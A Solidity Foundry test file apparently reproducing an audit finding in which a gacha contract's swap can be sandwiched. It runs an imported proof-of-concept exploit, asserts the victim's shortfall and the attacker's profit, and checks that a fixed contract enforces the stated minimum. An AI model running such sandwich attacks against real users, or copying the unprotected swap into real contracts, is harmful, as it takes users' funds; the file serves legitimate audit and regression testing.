// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Factory,
    GachaFixed,
    MiniToken,
    Pair,
    Router
} from "./53302-h-01-swap-is-vulnerable-to-sandwich-attacks-pashov-audit-gr.sol";

contract Finding53302Test is Test {
    function test_exploit_user_receives_less_than_stated_min() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.statedMin(), 86_127, "stated min is 95% of the fair quote");
        assertEq(e.userGot(), 41_591, "buyer meme received");
        assertEq(e.shortfall(), 44_536, "shortfall versus stated min");
        assertEq(e.profitPaid(), 54_273, "searcher PAY profit");
        assertLt(e.gacha().lastMin(), e.statedMin(), "protocol floor tracked the manipulated quote");
        assertGe(e.userGot(), e.gacha().lastMin(), "manipulated floor let the swap through");
        assertEq(e.pay().balanceOf(address(this)), 54_273, "profit token landed on the caller");
        assertEq(e.meme().balanceOf(address(e.victim())), 41_591, "victim holds the short fill");
    }

    function test_control_stated_min_reverts_after_the_same_price_move() public {
        (MiniToken pay, MiniToken meme, Router router, GachaFixed fixedGacha) = _pool();
        _movePrice(pay, meme, router);

        uint256 memeBefore = meme.balanceOf(address(this));
        vm.expectRevert(bytes("INSUFFICIENT_OUTPUT"));
        fixedGacha.purchase(86_127);
        assertEq(meme.balanceOf(address(this)), memeBefore, "fixed purchase paid nothing");
        assertEq(pay.balanceOf(address(fixedGacha)), 100_000, "ticket cost stayed in the fixed gacha");
    }

    function test_control_stated_min_pays_the_fair_quote() public {
        (, MiniToken meme,, GachaFixed fixedGacha) = _pool();
        uint256 got = fixedGacha.purchase(86_127);
        assertEq(got, 90_661, "fair fill");
        assertGe(got, 86_127, "control enforces the stated minimum");
        assertEq(meme.balanceOf(address(this)), 90_661, "buyer received the fair meme amount");
    }

    function _pool() internal returns (MiniToken pay, MiniToken meme, Router router, GachaFixed fixedGacha) {
        pay = new MiniToken("PAY");
        meme = new MiniToken("MEME");
        Pair pair = new Pair(address(pay), address(meme));
        Factory factory = new Factory(address(pair));
        router = new Router(address(pair));
        pair.setRouter(address(router));
        fixedGacha = new GachaFixed(address(router), address(factory), address(pay), address(meme), 100_000);
        pay.mint(address(this), 1_000_000);
        meme.mint(address(this), 1_000_000);
        pay.approve(address(pair), 1_000_000);
        meme.approve(address(pair), 1_000_000);
        pair.seed(1_000_000, 1_000_000);
        pay.mint(address(fixedGacha), 100_000);
    }

    function _movePrice(MiniToken pay, MiniToken meme, Router router) internal {
        pay.mint(address(this), 500_000);
        pay.approve(address(router), 500_000);
        address[] memory path = new address[](2);
        path[0] = address(pay);
        path[1] = address(meme);
        router.swapExactTokensForTokens(500_000, 0, path, address(this), block.timestamp + 1);
    }
}
